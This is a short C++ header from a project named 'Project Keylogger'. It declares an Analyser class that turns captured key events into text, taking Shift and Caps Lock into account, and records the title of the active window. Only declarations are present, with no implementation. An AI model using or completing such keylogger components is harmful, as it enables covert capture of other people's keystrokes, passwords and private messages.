/**
* Project Keylogger
*/

#ifndef									_ANALYSER_H
#define									_ANALYSER_H

#include								<Windows.h>
#include								<map>

#include								"IAnalyser.h"
#include								"AEvent.h"

class Analyser : public IAnalyser
{
public:
	Analyser();
	~Analyser();
	
	std::string&						analysis(AEvent*);
	std::string&						getWindowTitle(AEvent*);

private:
	void								initMap();
	int									isCapsLock() const;
private:
	std::map<int, std::string>			_translateMap;
	std::map<int, std::string>			_translateShiftMap;
};

#endif